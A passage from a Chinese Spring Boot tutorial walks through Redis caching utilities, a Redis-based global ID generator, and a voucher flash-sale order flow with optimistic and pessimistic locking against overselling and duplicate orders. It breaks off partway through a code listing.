在实际开发过程中，由于热点Key不会过期（除非之后人工删除），且往往提前导入缓存并设置逻辑过期时间。因此理论上这样的缓存不会未命中，查询时不需要判断键是否命中（如果不存在，说明它不属于热点Key；为了健壮性考虑，可以判断键是否命中，如果未命中，则直接返回空）。这里在`ShopServiceImpl`中定义一个方法模拟导入热点数据到缓存：

```java
import com.hmdp.utils.RedisData;
import java.time.LocalDateTime;

public void saveShop2Redis(Long id, Long expiredSeconds) {
    // 查询店铺数据
    Shop shop = getById(id);
    // 模拟重建的延时
    try {
        Thread.sleep(200);
    } catch (InterruptedException e) {
        e.printStackTrace();
    }
    // 封装逻辑过期时间
    RedisData redisData = new RedisData();
    redisData.setData(shop);
    redisData.setExpireTime(LocalDateTime.now().plusSeconds(expiredSeconds));
    // 写入Redis
    stringRedisTemplate.opsForValue().set(CACHE_SHOP_KEY + id, JSONUtil.toJsonStr(redisData));
}
```

修改`ShopServiceImpl`的`queryById`方法：

```java
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import cn.hutool.json.JSONObject;

private static final ExecutorService CACHE_REBUILD_EXECUTOR = Executors.newFixedThreadPool(10);

@Override
public Result queryById(Long id) {
    String key = CACHE_SHOP_KEY + id;
    // 从Redis查询商铺缓存
    String shopJson = stringRedisTemplate.opsForValue().get(key);
    // 判断是否存在
    if (StrUtil.isBlank(shopJson)) {
        // 存在，直接返回
        return Result.fail("店铺不存在！");
    }
    // 命中，需要先把JSON反序列为对象
    RedisData redisData = JSONUtil.toBean(shopJson, RedisData.class);
    Shop shop = JSONUtil.toBean((JSONObject) redisData.getData(), Shop.class);
    LocalDateTime expireTime = redisData.getExpireTime();
    // 判断是否过期
    if (expireTime.isAfter(LocalDateTime.now())) {
        // 未过期，直接返回店铺信息
        return Result.ok(shop);
    }
    // 已过期，需要缓存重建
    // 缓存重建：获取互斥锁
    String lockKey = LOCK_SHOP_KEY + id;
    boolean isLock = tryLock(lockKey);
    // 缓存重建：判断是否获取锁成功
    if (isLock) {
        // 缓存重建：成功，开启独立线程，实现缓存重建
        CACHE_REBUILD_EXECUTOR.submit(() -> {
            try {
                // 重建缓存
                // 为了测试，这里的expiredSeconds使用较小的值
                saveShop2Redis(id, 30L);
            } catch (Exception e) {
                throw new RuntimeException(e);
            } finally {
                // 释放锁
                unlock(lockKey);
            }
        });
    }
    // 返回过期的商铺信息
    return Result.ok(shop);
}
```

与基于互斥锁方式解决缓存击穿问题一样，该方法能解决缓存击穿问题，但是会出现一致性问题。如果缓存中的数据的`expireTime`过期（通过`saveShop2Redis`方法预先导入），且数据库发生改变，则高并发测试时，初始的若干次请求会出现不一致问题，但是后面的请求则得到最新的数据（如果测试时间足够的话）。

### 缓存工具封装

基于`StringRedisTemplate`封装一个缓存工具类，满足下列需求：

- 方法1：将任意Java对象序列化为JSON并存储在String类型的键中，并且可以设置TTL过期时间。
- 方法2：将任意Java对象序列化为JSON并存储在String类型的键中，并且可以设置逻辑过期时间，用于处理缓存击穿问题。
- 方法3：根据指定的键查询缓存，并反序列化为指定类型，利用缓存空值的方式解决缓存穿透问题。
- 方法4：根据指定的键查询缓存，并反序列化为指定类型，需要利用逻辑过期解决缓存击穿问题。

```java
package com.hmdp.utils;

import cn.hutool.core.util.BooleanUtil;
import cn.hutool.core.util.StrUtil;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import lombok.extern.slf4j.Slf4j;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Component;

import java.time.LocalDateTime;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.function.Function;

import static com.hmdp.utils.RedisConstants.*;

@Slf4j
@Component
public class CacheClient {

    private final StringRedisTemplate stringRedisTemplate;

    public CacheClient(StringRedisTemplate stringRedisTemplate) {
        this.stringRedisTemplate = stringRedisTemplate;
    }

    public void set(String key, Object value, Long time, TimeUnit unit) {
        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(value), time, unit);
    }

    public void setWithLogicalExpire(String key, Object value, Long time, TimeUnit unit) {
        // 设置逻辑过期
        RedisData redisData = new RedisData();
        redisData.setData(value);
        redisData.setExpireTime(LocalDateTime.now().plusSeconds(unit.toSeconds(time)));
        // 写入Redis
        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(redisData));
    }

    public <R, ID> R queryWithPassThrough(String keyPrefix, ID id, Class<R> type, Function<ID, R> dbFallback, Long time, TimeUnit unit) {
        String key = keyPrefix + id;
        // 从Redis查询商铺缓存
        String json = stringRedisTemplate.opsForValue().get(key);
        // 判断是否存在（如果命中的是空值，也是true）
        if (StrUtil.isNotBlank(json)) {
            // 存在，直接返回
            return JSONUtil.toBean(json, type);
        }
        // 判断命中的是否是空值
        if (json != null) {
            // 返回一个错误信息
            return null;
        }
        // 不存在，根据id查询数据库
        R r = dbFallback.apply(id);
        // 不存在，返回错误
        if (r == null) {
            // 将空值写入Redis
            stringRedisTemplate.opsForValue().set(key, "", CACHE_NULL_TTL, TimeUnit.MINUTES);
            // 返回错误信息
            return null;
        }
        // 存在，写入Redis
        set(key, r, time, unit);
        return r;
    }

    private static final ExecutorService CACHE_REBUILD_EXECUTOR = Executors.newFixedThreadPool(10);

    public <R, ID> R queryWithLogicalExpire(String keyPrefix, ID id, Class<R> type, Function<ID, R> dbFallback, Long time, TimeUnit unit) {
        String key = keyPrefix + id;
        // 从Redis查询商铺缓存
        String json = stringRedisTemplate.opsForValue().get(key);
        // 判断是否存在
        if (StrUtil.isBlank(json)) {
            // 存在，直接返回
            return null;
        }
        // 命中，需要先把JSON反序列为对象
        RedisData redisData = JSONUtil.toBean(json, RedisData.class);
        R r = JSONUtil.toBean((JSONObject) redisData.getData(), type);
        LocalDateTime expireTime = redisData.getExpireTime();
        // 判断是否过期
        if (expireTime.isAfter(LocalDateTime.now())) {
            // 未过期，直接返回店铺信息
            return r;
        }
        // 已过期，需要缓存重建
        // 缓存重建：获取互斥锁
        String lockKey = LOCK_SHOP_KEY + id;
        boolean isLock = tryLock(lockKey);
        // 缓存重建：判断是否获取锁成功
        if (isLock) {
            // 缓存重建：成功，开启独立线程，实现缓存重建
            CACHE_REBUILD_EXECUTOR.submit(() -> {
                try {
                    // 重建缓存：查询数据库并写入Redis
                    R r1 = dbFallback.apply(id);
                    setWithLogicalExpire(key, r1, time, unit);
                } catch (Exception e) {
                    throw new RuntimeException(e);
                } finally {
                    // 释放锁
                    unlock(lockKey);
                }
            });
        }
        // 返回过期的商铺信息
        return r;
    }
    
    // 额外的实现
    public <R, ID> R queryWithMutex(
            String keyPrefix, ID id, Class<R> type, Function<ID, R> dbFallback, Long time, TimeUnit unit) {
        String key = keyPrefix + id;
        // 1.从redis查询商铺缓存
        String shopJson = stringRedisTemplate.opsForValue().get(key);
        // 2.判断是否存在
        if (StrUtil.isNotBlank(shopJson)) {
            // 3.存在，直接返回
            return JSONUtil.toBean(shopJson, type);
        }
        // 判断命中的是否是空值
        if (shopJson != null) {
            // 返回一个错误信息
            return null;
        }

        // 4.实现缓存重建
        // 4.1.获取互斥锁
        String lockKey = LOCK_SHOP_KEY + id;
        R r = null;
        try {
            boolean isLock = tryLock(lockKey);
            // 4.2.判断是否获取成功
            if (!isLock) {
                // 4.3.获取锁失败，休眠并重试
                Thread.sleep(50);
                return queryWithMutex(keyPrefix, id, type, dbFallback, time, unit);
            }
            // 4.4.获取锁成功，根据id查询数据库
            r = dbFallback.apply(id);
            // 5.不存在，返回错误
            if (r == null) {
                // 将空值写入redis
                stringRedisTemplate.opsForValue().set(key, "", CACHE_NULL_TTL, TimeUnit.MINUTES);
                // 返回错误信息
                return null;
            }
            // 6.存在，写入redis
            this.set(key, r, time, unit);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }finally {
            // 7.释放锁
            unlock(lockKey);
        }
        // 8.返回
        return r;
    }

    private boolean tryLock(String key) {
        Boolean flag = stringRedisTemplate.opsForValue().setIfAbsent(key, "1", 10, TimeUnit.SECONDS);
        return BooleanUtil.isTrue(flag);
    }

    private void unlock(String key) {
        stringRedisTemplate.delete(key);
    }

}
```

下面就可以使用工具类解决缓存穿透问题了：

```java
import com.hmdp.utils.CacheClient;

@Resource
private CacheClient cacheClient;

@Override
public Result queryById(Long id) {
    // 解决缓存穿透
    Shop shop = cacheClient.queryWithPassThrough(CACHE_SHOP_KEY, id, Shop.class, this::getById, CACHE_SHOP_TTL, TimeUnit.MINUTES);
    if (shop == null) {
        return Result.fail("店铺不存在！");
    }
    return Result.ok(shop);
}
```

解决缓存击穿问题类似：

```java
@Override
public Result queryById(Long id) {
    // 逻辑过期解决缓存击穿
    Shop shop = cacheClient.queryWithLogicalExpire(CACHE_SHOP_KEY, id, Shop.class, this::getById, CACHE_SHOP_TTL, TimeUnit.MINUTES);
    if (shop == null) {
        return Result.fail("店铺不存在！");
    }
    return Result.ok(shop);
}
```

## 优惠券秒杀

### 全局唯一ID

每个店铺都可以发布优惠券。

当用户抢购时，就会生成订单并保存到tb_voucher_order表中，而订单表如果使用数据库自增ID就存在一些问题：

- id的规律性太明显（容易让用户猜测到一些信息）。

- 受单表数据量的限制（如果订单数量过多，需要多张表保存，此时不能保证订单id的唯一性）。

全局ID生成器，是一种在分布式系统下用来生成全局唯一ID的工具（这里的全局指的是整个业务），一般要满足下列特性：

- 唯一性。
- 高可用。
- 高性能。
- 递增性。确保ID整体变大的趋势，有利于提升数据库效率。
- 安全性。规律性不要太明显。

全局唯一ID生成策略包括：

- UUID（字符串表示的十六进制数值，非单调递增）。

- Redis自增。

- snowflake算法（不依赖于Redis，因此性能可能更高；需要维护机器ID、对时钟依赖高）。

- 数据库自增（单独设置一张表专门用于自增，其他表的ID从该表中获取，可以看作Redis自增的数据库版，性能不如Redis自增，因此需要采取一些方案，例如批量获取ID，在内存中缓存，然后再使用）。

#### 全局ID生成器

为了增加ID的安全性，我们可以不直接使用Redis自增的数值，而是拼接一些其它信息。ID的组成部分：

- 符号位：1bit，永远为0。
- 时间戳：31bit，以秒为单位，可以使用69年。
- 序列号：32bit，秒内的计数器，支持每秒产生$2^{32}$个不同ID。

Redis自增ID策略：

- 每天一个键，方便统计订单量。

- ID构造是时间戳 + 计数器。

实现如下：

```java
package com.hmdp.utils;

import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Component;

import java.time.LocalDateTime;
import java.time.ZoneOffset;
import java.time.format.DateTimeFormatter;

@Component
public class RedisIdWorker {

    /**
     * 开始时间戳：2022年1月1日00:00:00
     */
    private static final long BEGIN_TIMESTAMP = 1640995200L;

    /**
     * 序列号的位数
     */
    private static final int COUNT_BITS = 32;

    private final StringRedisTemplate stringRedisTemplate;

    public RedisIdWorker(StringRedisTemplate stringRedisTemplate) {
        this.stringRedisTemplate = stringRedisTemplate;
    }

    public long nextId(String keyPrefix) {
        // 生成时间戳
        LocalDateTime now = LocalDateTime.now();
        long nowSecond = now.toEpochSecond(ZoneOffset.UTC);
        long timestamp = nowSecond - BEGIN_TIMESTAMP;
        // 生成序列号
        // 获取当前日期，精确到天（防止序列号溢出，顺便能统计每天/月/日的记录数）
        String date = now.format(DateTimeFormatter.ofPattern("yyyy:MM:dd"));
        long count = stringRedisTemplate.opsForValue().increment("icr:" + keyPrefix + ":" + date);  // IDE可能提示空指针异常，实际不会发生；如果键不存在，则自动创建键；必须拼接date，防止溢出风险
        // 拼接并返回
        return timestamp << COUNT_BITS | count;
    }

}
```

### 实现优惠券秒杀下单

每个店铺都可以发布优惠券，分为平价券和特价券。平价券可以任意购买，而特价券需要秒杀抢购（有库存与时间限制）。

表关系如下：

- tb_voucher：优惠券的基本信息，优惠金额、使用规则等。
- tb_seckill_voucher：优惠券的库存、开始抢购时间，结束抢购时间。特价优惠券才需要填写这些信息。

在`VoucherController`中提供了一个接口，可以添加秒杀优惠券（以及其他实现）：

```java
package com.hmdp.controller;


import com.hmdp.dto.Result;
import com.hmdp.entity.Voucher;
import com.hmdp.service.IVoucherService;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;

@RestController
@RequestMapping("/voucher")
public class VoucherController {

    @Resource
    private IVoucherService voucherService;

    /**
     * 新增普通券
     * @param voucher 优惠券信息
     * @return 优惠券id
     */
    @PostMapping
    public Result addVoucher(@RequestBody Voucher voucher) {
        voucherService.save(voucher);
        return Result.ok(voucher.getId());
    }

    /**
     * 新增秒杀券
     * @param voucher 优惠券信息，包含秒杀信息
     * @return 优惠券id
     */
    @PostMapping("seckill")
    public Result addSeckillVoucher(@RequestBody Voucher voucher) {
        voucherService.addSeckillVoucher(voucher);
        return Result.ok(voucher.getId());
    }

    /**
     * 查询店铺的优惠券列表
     * @param shopId 店铺id
     * @return 优惠券列表
     */
    @GetMapping("/list/{shopId}")
    public Result queryVoucherOfShop(@PathVariable("shopId") Long shopId) {
       return voucherService.queryVoucherOfShop(shopId);
    }
    
}
```

对应的`IVoucherService`如下：

```java
package com.hmdp.service;

import com.hmdp.dto.Result;
import com.hmdp.entity.Voucher;
import com.baomidou.mybatisplus.extension.service.IService;

public interface IVoucherService extends IService<Voucher> {

    Result queryVoucherOfShop(Long shopId);

    void addSeckillVoucher(Voucher voucher);
}
```

```java
package com.hmdp.service.impl;

import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.hmdp.dto.Result;
import com.hmdp.entity.Voucher;
import com.hmdp.mapper.VoucherMapper;
import com.hmdp.entity.SeckillVoucher;
import com.hmdp.service.ISeckillVoucherService;
import com.hmdp.service.IVoucherService;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import javax.annotation.Resource;
import java.util.List;

@Service
public class VoucherServiceImpl extends ServiceImpl<VoucherMapper, Voucher> implements IVoucherService {

    @Resource
    private ISeckillVoucherService seckillVoucherService;

    @Override
    public Result queryVoucherOfShop(Long shopId) {
        // 查询优惠券信息
        List<Voucher> vouchers = getBaseMapper().queryVoucherOfShop(shopId);
        // 返回结果
        return Result.ok(vouchers);
    }

    @Override
    @Transactional
    public void addSeckillVoucher(Voucher voucher) {
        // 保存优惠券
        save(voucher);
        // 保存秒杀信息
        SeckillVoucher seckillVoucher = new SeckillVoucher();
        seckillVoucher.setVoucherId(voucher.getId());
        seckillVoucher.setStock(voucher.getStock());
        seckillVoucher.setBeginTime(voucher.getBeginTime());
        seckillVoucher.setEndTime(voucher.getEndTime());
        seckillVoucherService.save(seckillVoucher);
    }
}
```

`Voucher`类的定义如下：

```java
package com.hmdp.entity;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableField;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;
import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.experimental.Accessors;

import java.io.Serializable;
import java.time.LocalDateTime;

@Data
@EqualsAndHashCode(callSuper = false)
@Accessors(chain = true)
@TableName("tb_voucher")
public class Voucher implements Serializable {

    private static final long serialVersionUID = 1L;

    /**
     * 主键
     */
    @TableId(value = "id", type = IdType.AUTO)
    private Long id;

    /**
     * 商铺id
     */
    private Long shopId;

    /**
     * 代金券标题
     */
    private String title;

    /**
     * 副标题
     */
    private String subTitle;

    /**
     * 使用规则
     */
    private String rules;

    /**
     * 支付金额
     */
    private Long payValue;

    /**
     * 抵扣金额
     */
    private Long actualValue;

    /**
     * 优惠券类型
     */
    private Integer type;

    /**
     * 优惠券类型
     */
    private Integer status;
    /**
     * 库存
     */
    @TableField(exist = false)
    private Integer stock;

    /**
     * 生效时间
     */
    @TableField(exist = false)
    private LocalDateTime beginTime;

    /**
     * 失效时间
     */
    @TableField(exist = false)
    private LocalDateTime endTime;

    /**
     * 创建时间
     */
    private LocalDateTime createTime;


    /**
     * 更新时间
     */
    private LocalDateTime updateTime;

}
```

`SeckillVoucher`的定义如下：

```java
package com.hmdp.entity;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;
import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.experimental.Accessors;

import java.io.Serializable;
import java.time.LocalDateTime;

/**
 * 秒杀优惠券表，与优惠券是一对一关系
 */
@Data
@EqualsAndHashCode(callSuper = false)
@Accessors(chain = true)
@TableName("tb_seckill_voucher")
public class SeckillVoucher implements Serializable {

    private static final long serialVersionUID = 1L;

    /**
     * 关联的优惠券的id
     */
    @TableId(value = "voucher_id", type = IdType.INPUT)
    private Long voucherId;

    /**
     * 库存
     */
    private Integer stock;

    /**
     * 创建时间
     */
    private LocalDateTime createTime;

    /**
     * 生效时间
     */
    private LocalDateTime beginTime;

    /**
     * 失效时间
     */
    private LocalDateTime endTime;

    /**
     * 更新时间
     */
    private LocalDateTime updateTime;


}
```

`VoucherMapper`类的定义如下：

```java
package com.hmdp.mapper;

import com.baomidou.mybatisplus.core.mapper.BaseMapper;
import com.hmdp.entity.Voucher;
import org.apache.ibatis.annotations.Param;

import java.util.List;

public interface VoucherMapper extends BaseMapper<Voucher> {

    List<Voucher> queryVoucherOfShop(@Param("shopId") Long shopId);
}
```

`ISeckillVoucherService`的定义如下：

```java
package com.hmdp.service;

import com.hmdp.entity.SeckillVoucher;
import com.baomidou.mybatisplus.extension.service.IService;

/**
 * 秒杀优惠券表，与优惠券是一对一关系 服务类
 */
public interface ISeckillVoucherService extends IService<SeckillVoucher> {

}
```

```java
package com.hmdp.service.impl;

import com.hmdp.entity.SeckillVoucher;
import com.hmdp.mapper.SeckillVoucherMapper;
import com.hmdp.service.ISeckillVoucherService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import org.springframework.stereotype.Service;

/**
 * 秒杀优惠券表，与优惠券是一对一关系 服务实现类
 */
@Service
public class SeckillVoucherServiceImpl extends ServiceImpl<SeckillVoucherMapper, SeckillVoucher> implements ISeckillVoucherService {}
```

`SeckillVoucherMapper`类的定义如下：

```java
package com.hmdp.mapper;

import com.hmdp.entity.SeckillVoucher;
import com.baomidou.mybatisplus.core.mapper.BaseMapper;

public interface SeckillVoucherMapper extends BaseMapper<SeckillVoucher> {

}
```

给id为1的商铺添加一个特价券：

```json
{
    "shopId" : 1,
    "title": "100元代金券",
    "subTitle": "周一至周日均可使用",
    "rules": "全场通用\\n无需预约\\n可无限叠加\\不兑现、不找零\\n仅限食堂",
    "payValue": 8000,
    "actualValue": 10000,
    "type": 1,
    "stock": 100,
    "beginTime": "2022-05-31T12:00:00",
    "endTime": "2022-06-01T12:00:00"

}
```

下面实现优惠券秒杀的下单功能，下单时需要判断两点：

- 秒杀是否开始或结束，如果尚未开始或已经结束则无法下单。

- 库存是否充足，不足则无法下单。

创建`VoucherOrderController`：

```java
package com.hmdp.controller;

import com.hmdp.dto.Result;
import com.hmdp.service.IVoucherOrderService;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.annotation.Resource;

@RestController
@RequestMapping("/voucher-order")
public class VoucherOrderController {

    @Resource
    private IVoucherOrderService voucherOrderService;

    @PostMapping("seckill/{id}")
    public Result seckillVoucher(@PathVariable("id") Long voucherId) {
        return voucherOrderService.seckillVoucher(voucherId);
    }

}
```

对应的`IVoucherOrderService`：

```java
package com.hmdp.service;

import com.hmdp.dto.Result;
import com.hmdp.entity.VoucherOrder;
import com.baomidou.mybatisplus.extension.service.IService;

public interface IVoucherOrderService extends IService<VoucherOrder> {

    Result seckillVoucher(Long voucherId);
    
}
```

```java
package com.hmdp.service.impl;

import com.hmdp.dto.Result;
import com.hmdp.entity.SeckillVoucher;
import com.hmdp.entity.VoucherOrder;
import com.hmdp.mapper.VoucherOrderMapper;
import com.hmdp.service.ISeckillVoucherService;
import com.hmdp.service.IVoucherOrderService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.hmdp.utils.RedisIdWorker;
import com.hmdp.utils.UserHolder;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import javax.annotation.Resource;
import java.time.LocalDateTime;

@Service
public class VoucherOrderServiceImpl extends ServiceImpl<VoucherOrderMapper, VoucherOrder> implements IVoucherOrderService {

    @Resource
    private ISeckillVoucherService seckillVoucherService;

    @Resource
    private RedisIdWorker redisIdWorker;

    @Override
    @Transactional
    public Result seckillVoucher(Long voucherId) {
        // 查询优惠券
        SeckillVoucher voucher = seckillVoucherService.getById(voucherId);
        // 判断秒杀是否开始
        if (voucher.getBeginTime().isAfter(LocalDateTime.now())) {
            // 尚未开始
            return Result.fail("秒杀尚未开始！");
        }
        // 判断秒杀是否已经结束
        if (voucher.getEndTime().isBefore(LocalDateTime.now())) {
            return Result.fail("秒杀已经结束！");
        }
        // 判断库存是否充足
        if (voucher.getStock() < 1) {
            // 库存不足
            return Result.fail("库存不足！");
        }
        // 扣减库存
        boolean success = seckillVoucherService.update()
                .setSql("stock = stock - 1")
                .eq("voucher_id", voucherId).update();
        if (!success) {
            // 扣减失败
            return Result.fail("库存不足！");
        }
        // 创建订单
        VoucherOrder voucherOrder = new VoucherOrder();
        long orderId = redisIdWorker.nextId("order");
        voucherOrder.setId(orderId);  // 订单id
        Long userId = UserHolder.getUser().getId();
        voucherOrder.setUserId(userId);  // 用户id
        voucherOrder.setVoucherId(voucherId);  // 代金券id
        save(voucherOrder);
        // 返回订单id
        return Result.ok(orderId);
    }

}
```

其中，`VoucherOrder`的实现如下：

```java
package com.hmdp.entity;

import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.annotation.TableId;
import com.baomidou.mybatisplus.annotation.TableName;
import lombok.Data;
import lombok.EqualsAndHashCode;
import lombok.experimental.Accessors;

import java.io.Serializable;
import java.time.LocalDateTime;

@Data
@EqualsAndHashCode(callSuper = false)
@Accessors(chain = true)
@TableName("tb_voucher_order")
public class VoucherOrder implements Serializable {

    private static final long serialVersionUID = 1L;

    /**
     * 主键
     */
    @TableId(value = "id", type = IdType.INPUT)
    private Long id;

    /**
     * 下单的用户id
     */
    private Long userId;

    /**
     * 购买的代金券id
     */
    private Long voucherId;

    /**
     * 支付方式 1：余额支付；2：支付宝；3：微信
     */
    private Integer payType;

    /**
     * 订单状态，1：未支付；2：已支付；3：已核销；4：已取消；5：退款中；6：已退款
     */
    private Integer status;

    /**
     * 下单时间
     */
    private LocalDateTime createTime;

    /**
     * 支付时间
     */
    private LocalDateTime payTime;

    /**
     * 核销时间
     */
    private LocalDateTime useTime;

    /**
     * 退款时间
     */
    private LocalDateTime refundTime;

    /**
     * 更新时间
     */
    private LocalDateTime updateTime;


}
```

`VoucherOrderMapper`的实现如下：

```java
package com.hmdp.mapper;

import com.hmdp.entity.VoucherOrder;
import com.baomidou.mybatisplus.core.mapper.BaseMapper;

public interface VoucherOrderMapper extends BaseMapper<VoucherOrder> {}
```

### 超卖问题

在高并发场景下，可能会出现优惠券超卖情况（使用JMeter测试即可），并且订单表中的记录数也比预期最大记录数多。

假设现在库存数量为1，线程1查询库存，判断库存数量大于0。此时线程2查询库存，发现库存数量也是1。两个线程都执行扣减库存并下单的操作，导致库存为-1。

超卖问题是典型的多线程安全问题，针对这一问题的常见解决方案就是加锁。

悲观锁认为线程安全问题一定会发生，因此在操作数据之前先获取锁，确保线程串行执行。例如`synchronized`关键字、`java.util.concurrent.locks.Lock`都属于悲观锁的实现。悲观锁实现起来简单粗暴，由于加锁导致线程串行执行，因此悲观锁的性能一般，不适用于高并发的场景。

乐观锁认为线程安全问题不一定会发生，因此不加锁，只是在更新数据时去判断有没有其它线程对数据做了修改。如果没有修改则认为是安全的，自己才更新数据。如果已经被其它线程修改说明发生了安全问题，此时可以重试或异常。乐观锁的优点是性能好，但是存在成功率低的问题。

乐观锁的关键是判断之前查询得到的数据是否有被修改过，常见的方式有两种：

- 版本号法：给数据加上一个版本，在多线程并发时基于版本号判断有没有被修改。每当数据被修改，版本号加1。线程1、2查询库存时，都发现其版本号为1。线程修改库存时必须判断当前版本号是否等于之前查询得到的版本号，如果是，则执行扣减库存并递增版本号操作。
- CAS（compare and switch/set）法：版本号法的简化。因为版本号与库存是一一对应的，因此可以取消版本号，使用库存（即数据本身）代替版本号。

使用乐观锁，只需要将`seckillVoucher`方法内的扣减库存语句修改即可：

```java
// 扣减库存
boolean success = seckillVoucherService.update()
        .setSql("stock = stock - 1")
        .eq("voucher_id", voucherId)
        .eq("stock", voucher.getStock())
        .update();
```

该方法能够解决超卖问题，但是会导致优惠券抢购成功率太低。

解决失败率高问题的方法有多种，一种方法是判断库存是否大于0：

```java
// 扣减库存
boolean success = seckillVoucherService.update()
        .setSql("stock = stock - 1")
        .eq("voucher_id", voucherId)
        .gt("stock", 0)
        .update();
```

要想提高性能/成功率，还可以采用分批加锁（分段锁）方案，将数据资源分成若干份（例如将大表拆分为多张小表），每份数据资源分别加锁。

### 一人一单

需求：修改秒杀业务，要求同一个优惠券，一个用户只能下一单。

修改`VoucherOrderServiceImpl`的`seckillVoucher`方法：

```java
@Override
@Transactional
public Result seckillVoucher(Long voucherId) {
    // 查询优惠券
    SeckillVoucher voucher = seckillVoucherService.getById(voucherId);
    // 判断秒杀是否开始
    if (voucher.getBeginTime().isAfter(LocalDateTime.now())) {
        // 尚未开始
        return Result.fail("秒杀尚未开始！");
    }
    // 判断秒杀是否已经结束
    if (voucher.getEndTime().isBefore(LocalDateTime.now())) {
        return Result.fail("秒杀已经结束！");
    }
    // 判断库存是否充足
    if (voucher.getStock() < 1) {
        // 库存不足
        return Result.fail("库存不足！");
    }
    Long userId = UserHolder.getUser().getId();
    // 一人一单：查询订单
    int count = query().eq("user_id", userId).eq("voucher_id", voucherId).count();
    // 一人一单：判断是否存在
    if (count > 0) {
        // 用户已经购买过了
        return Result.fail("用户已经购买过一次！");
    }
    // 扣减库存
    boolean success = seckillVoucherService.update()
        .setSql("stock = stock - 1")
        .eq("voucher_id", voucherId)
        .gt("stock", 0)
        .update();
    if (!success) {
        // 扣减失败
        return Result.fail("库存不足！");
    }
    // 创建订单
    VoucherOrder voucherOrder = new VoucherOrder();
    long orderId = redisIdWorker.nextId("order");
    voucherOrder.setId(orderId);  // 订单id
    voucherOrder.setUserId(userId);  // 用户id
    voucherOrder.setVoucherId(voucherId);  // 代金券id
    save(voucherOrder);
    // 返回订单id
    return Result.ok(orderId);
}
```

以上代码会出现并发问题（一个用户抢购多单）。由于这里没有更新而是插入数据，因此无法使用CAS法，这里使用悲观锁。

引入依赖：

```xml
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjweaver</artifactId>
</dependency>
```

修改启动类：

```java
package com.hmdp;

import org.mybatis.spring.annotation.MapperScan;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.EnableAspectJAutoProxy;

@EnableAspectJAutoProxy(exposeProxy = true)
@MapperScan("com.hmdp.mapper")
@SpringBootApplication
public class HmDianPingApplication {

    public static void main(String[] args) {
        SpringApplication.run(HmDianPingApplication.class, args);
    }

}
```

修改`IVoucherOrderService`：

```java
package com.hmdp.service;

import com.hmdp.dto.Result;
import com.hmdp.entity.VoucherOrder;
import com.baomidou.mybatisplus.extension.service.IService;

public interface IVoucherOrderService extends IService<VoucherOrder> {

    Result seckillVoucher(Long voucherId);

    Result createVoucherOrder(Long voucherId);
    
}
```

```java
package com.hmdp.service.impl;

import com.hmdp.dto.Result;
import com.hmdp.entity.SeckillVoucher;
import com.hmdp.entity.VoucherOrder;
import com.hmdp.mapper.VoucherOrderMapper;
import com.hmdp.service.ISeckillVoucherService;
import com.hmdp.service.IVoucherOrderService;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.hmdp.utils.RedisIdWorker;
import com.hmdp.utils.UserHolder;
import org.springframework.aop.framework.AopContext;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import javax.annotation.Resource;
import java.time.LocalDateTime;

@Service
public class VoucherOrderServiceImpl extends ServiceImpl<VoucherOrderMapper, VoucherOrder> implements IVoucherOrderService {

    @Resource
    private ISeckillVoucherService seckillVoucherService;

    @Resource
    private RedisIdWorker redisIdWorker;

    @Override
    public Result seckillVoucher(Long voucherId) {
        // 查询优惠券
        SeckillVoucher voucher = seckillVoucherService.getById(voucherId);
        // 判断秒杀是否开始
        if (voucher.getBeginTime().isAfter(LocalDateTime.now())) {
            // 尚未开始
            return Result.fail("秒杀尚未开始！");
        }
        // 判断秒杀是否已经结束
        if (voucher.getEndTime().isBefore(LocalDateTime.now())) {
            return Result.fail("秒杀已经结束！");
        }
        // 判断库存是否充足
        if (voucher.getStock() < 1) {
            // 库存不足
            return Result.fail("库存不足！");
        }
        Long userId = UserHolder.getUser().getId();
        // 不能使用userId或userId.toString()，因为它们每次返回一个新对象；必须先获取锁，然后提交事务，最后释放锁，因此不能仅在createVoucherOrder方法内加上同步锁
        synchronized (userId.toString().intern()) {
            // 获取代理对象（事务）
            IVoucherOrderService proxy = (IVoucherOrderService) AopContext.currentProxy();
            return proxy.createVoucherOrder(voucherId);
        }
    }

    @Transactional
    public Result createVoucherOrder(Long voucherId) {
        Long userId = UserHolder.getUser().getId();
        // 一人一单：查询订单
        int count = query().eq("user_id", userId).eq("voucher_id", voucherId).count();
        // 一人一单：判断是否存在
        if (count > 0) {
            // 用户已经购买过了
            return Result.fail("用户已经购买过一次！");
        }
        // 扣减库存
        boolean success = seckillVoucherService.update()
                .setSql("stock = stock - 1")
                .eq("voucher_id", voucherId)
                .gt("stock", 0)
                .update();
        if (!success) {
            // 扣减失败
            return Result.fail("库存不足！");
        }
        // 创建订单
        VoucherOrder voucherOrder = new VoucherOrder();
